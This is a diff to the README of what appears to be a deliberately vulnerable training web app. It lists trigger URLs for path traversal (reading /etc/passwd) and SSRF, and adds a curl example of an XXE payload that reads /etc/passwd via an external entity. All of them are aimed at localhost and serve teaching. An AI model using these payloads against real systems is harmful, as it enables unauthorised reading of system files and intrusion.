@@ -55,6 +55,14 @@ Here are some of the vulnerabilities included in this application and how to tri
   - `http://localhost:3000/file?name=../../../../etc/passwd`
 - **Server-Side Request Forgery (SSRF):**
   - `http://localhost:3000/ssrf?url=http://localhost:3000/secrets`
+- **XML External Entity (XXE) Injection:**
+  - Demo page: `http://localhost:3000/xxe/demo`
+  - Attack example:
+    ```bash
+    curl -X POST http://localhost:3000/xxe/parse \
+      -H "Content-Type: application/json" \
+      -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}'
+    ```
 
 ## Disclaimer
 
